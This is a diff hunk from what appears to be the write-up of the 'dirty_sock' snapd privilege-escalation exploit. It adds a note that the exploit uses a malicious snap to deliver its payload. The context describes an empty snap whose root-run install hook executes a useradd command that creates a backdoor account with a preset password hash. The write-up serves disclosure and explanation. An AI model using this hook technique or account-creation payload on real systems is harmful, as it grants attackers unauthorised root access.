@@ -268,7 +268,11 @@ Snaps themselves run in sandboxes and require digital signatures matching public
 
 Additionally, snaps have something called "hooks". One such hook, the "install hook" is run at the time of snap installation and can be a simple shell script. If the snap is configured in "devmode", then this hook will be run in the context of root.
 
-I created a snap from scratch that is essentially empty and has no functionality. What it does have, however, is a bash script that is executed at install time. That bash script runs the following commands:
+I created a snap from scratch that is essentially empty and has no functionality. What it does have, however, is a bash script that is executed at install time. 
+
+*Note for clarity: This version of the exploit does not hide inside a malicious snap. Instead, it uses a malicious snap as a delivery mechanism for the user creation payload. This is possible due to the same uid=0 bug as version 1*
+
+That bash script runs the following commands:
 
 ```
 useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
